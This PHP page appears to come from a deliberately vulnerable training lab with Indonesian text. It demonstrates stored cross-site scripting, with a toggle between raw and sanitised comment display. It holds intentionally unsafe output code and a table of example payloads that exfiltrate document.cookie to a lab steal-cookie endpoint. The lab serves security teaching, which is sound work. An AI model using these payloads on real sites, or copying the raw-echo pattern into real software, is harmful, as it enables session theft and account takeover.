<?php
require_once __DIR__ . '/../../includes/functions.php';

$currentPage = 'stored.php';
$pageTitle = 'XSS Stored';
$pageSubtitle = 'Cross-Site Scripting - Stored / Persistent (Medium security)';

$secure = isSecureMode('xss_stored');

if (isset($_POST['toggle'])) {
    toggleSetting('xss_stored');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'], $_POST['message'])) {
    $username = $_POST['username'];
    $message  = $_POST['message'];

    if (!$secure) {
        logPayload(substr($message, 0, 300), 'xss_stored');
    }

    if ($secure) {
        $username = sanxss($username);
        $message  = sanxss($message);
    }

    $stmt = $db->prepare("INSERT INTO comments (username, message) VALUES (?, ?)");
    $stmt->execute([$username, $message]);

    $flash = $secure
        ? '<div class="alert alert-success"><span class="alert-icon">&#10004;</span><div><strong>Komentar disimpan (telah disanitasi).</strong> Tag HTML dihapus.</div></div>'
        : '<div class="alert alert-danger"><span class="alert-icon">&#9888;</span><div><strong>Komentar disimpan (mentah).</strong> Jika berisi payload XSS, akan dieksekusi saat halaman dibuka.</div></div>';

    redirect('/xss/stored.php');
}

$comments = $db->query("SELECT * FROM comments ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);

$vulnCode = <<<'PHP'
// SIMPAN - tanpa sanitasi
INSERT INTO comments (username, message) VALUES (?, ?);

// TAMPIL - tanpa sanitasi
echo $row['username'];
echo $row['message'];
PHP;

$secureCode = <<<'PHP'
// SIMPAN - sanitasi HTML
$u = htmlspecialchars($_POST['username']);
$m = htmlspecialchars($_POST['message']);
INSERT INTO comments (username, message) VALUES ($u, $m);
PHP;

ob_start();
?>
<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128172;</span> Tambah Komentar</h3>
        <div style="display:flex;gap:10px;align-items:center;">
            <?php echo getSecurityBadge('medium'); ?>
            <?php echo getModeBadge($secure); ?>
        </div>
    </div>
    <div class="card-body">
        <?php if ($secure): ?>
            <div class="alert alert-success"><span class="alert-icon">&#10004;</span>
                <div><strong>Mode SECURE aktif.</strong> Semua tag HTML dihapus sebelum disimpan.</div>
            </div>
        <?php else: ?>
            <div class="alert alert-danger"><span class="alert-icon">&#9888;</span>
                <div><strong>Mode VULNERABLE aktif.</strong> Komentar disimpan &amp; ditampilkan mentah &mdash; payload dieksekusi setiap halaman dibuka.</div>
            </div>
        <?php endif; ?>

        <form method="post" action="/xss/stored.php">
            <div class="floating-label">
                <input type="text" name="username" id="username" placeholder="Nama Anda" required>
                <label for="username">Nama</label>
            </div>
            <div class="floating-label">
                <textarea name="message" id="message" placeholder="Pesan Anda..." required></textarea>
                <label for="message">Pesan</label>
            </div>
            <div style="display:flex;gap:10px;">
                <button type="submit" class="btn btn-primary">&#128221; Kirim Komentar</button>
        </form>
        <form method="post" action="/xss/stored.php">
            <input type="hidden" name="toggle" value="1">
            <button type="submit" class="btn <?php echo $secure ? 'btn-danger' : 'btn-success'; ?>">
                <?php echo $secure ? '&#128683; Beralih ke Vulnerable' : '&#128274; Beralih ke Secure'; ?>
            </button>
        </form>
            </div>
        </form>
    </div>
</div>

<?php if (isset($flash) && $flash) echo $flash; ?>

<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128202;</span> Komentar Terbaru</h3>
        <span class="badge badge-primary"><?php echo count($comments); ?> komentar</span>
    </div>
    <div class="card-body">
        <?php if (count($comments) === 0): ?>
            <p class="text-muted">Belum ada komentar. Coba kirim payload berbasis cookie-stealing.</p>
        <?php endif; ?>

        <?php foreach ($comments as $c): ?>
        <div class="comment-item">
            <div class="comment-author">
                <div class="comment-avatar"><?php echo $secure ? e(strtoupper(substr($c['username'], 0, 1))) : strtoupper(substr($c['username'], 0, 1)); ?></div>
                <div>
                    <div class="comment-name"><?php echo $secure ? e($c['username']) : $c['username']; ?></div>
                    <div class="comment-date"><?php echo e($c['created_at']); ?></div>
                </div>
            </div>
            <div class="comment-message"><?php echo $secure ? e($c['message']) : $c['message']; ?></div>
        </div>
        <?php endforeach; ?>
    </div>
</div>

<div class="card">
    <div class="card-header">
        <h3><span class="card-icon">&#128640;</span> Payload Contoh</h3>
    </div>
    <div class="card-body">
        <table>
            <thead><tr><th>Payload</th><th>Efek</th></tr></thead>
            <tbody>
                <tr><td><code>&lt;script&gt;fetch('/steal-cookie.php?c='+document.cookie)&lt;/script&gt;</code></td><td>Curi cookie tiap kali halaman dibuka</td></tr>
                <tr><td><code>&lt;img src=x onerror=alert(document.domain)&gt;</code></td><td>Tanpa tag <code>script</code></td></tr>
                <tr><td><code>&lt;script&gt;new Image().src='/steal-cookie.php?c='+document.cookie&lt;/script&gt;</code></td><td>Varian tanpa fetch</td></tr>
            </tbody>
        </table>
        <div class="card" style="margin-top:16px;">
            <div class="card-header">
                <h3><span class="card-icon">&#128295;</span> Perbandingan Kode</h3>
            </div>
            <div class="card-body flex gap-2">
                <div style="flex:1;"><?php echo codePreview('vulnerable', $vulnCode); ?></div>
                <div style="flex:1;"><?php echo codePreview('patched', $secureCode); ?></div>
            </div>
        </div>
        <a href="/dashboard.php" class="btn btn-outline mt-2">&#127891; Lihat Cookie yang Tercuri</a>
    </div>
</div>
<?php
$content = ob_get_clean();
require __DIR__ . '/../../includes/layout.php';